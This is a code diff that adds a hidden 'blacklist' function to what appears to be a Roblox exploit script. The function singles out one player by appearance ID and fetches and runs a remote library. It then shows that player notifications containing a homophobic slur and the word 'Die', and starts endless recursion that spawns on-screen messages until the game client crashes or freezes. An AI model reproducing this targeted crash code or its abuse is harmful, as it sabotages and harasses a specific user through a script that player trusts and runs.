@@ -5912,6 +5912,43 @@ coroutine.wrap(hh)()
 game.Players.PlayerAdded:Connect(hh)
 end
 
+local function blacklist()
+  wait(1)
+if game.Players.LocalPlayer.CharacterAppearanceId == 690624548 then
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+ OrionLib:MakeNotification({
+	Name = "Message to the Faggot",
+	Content = "How could you betray me I don’t make scripts for people like you\nWell, you could rat me out, but I don’t want that, and therefore I will forbid you to use the script",
+	Image = "rbxassetid://4483345998",
+	Time = 15
+ })
+wait(15)
+ OrionLib:MakeNotification({
+	Name = "Die",
+	Content = "But there will also be punishment",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+ wait(5)
+OrionLib:MakeNotification({
+	Name = "DIE",
+	Content = "<p><font size='30'>BEHOLD THE POWER OF RECURTION!!</font></p>",
+	Image = "rbxassetid://4483345998",
+	Time = 1e9
+})
+  wait(2)
+  local function die()
+   local mes = Instance.new("Message", workspace)
+   mes.Text = "Die"
+   die()
+  end
+  
+  die()
+end
+ end
+ 
+ coroutine.wrap(blacklist)()
+
 coroutine.wrap(antivoidbring)()
 coroutine.wrap(antireporters)()
 coroutine.wrap(DS)()
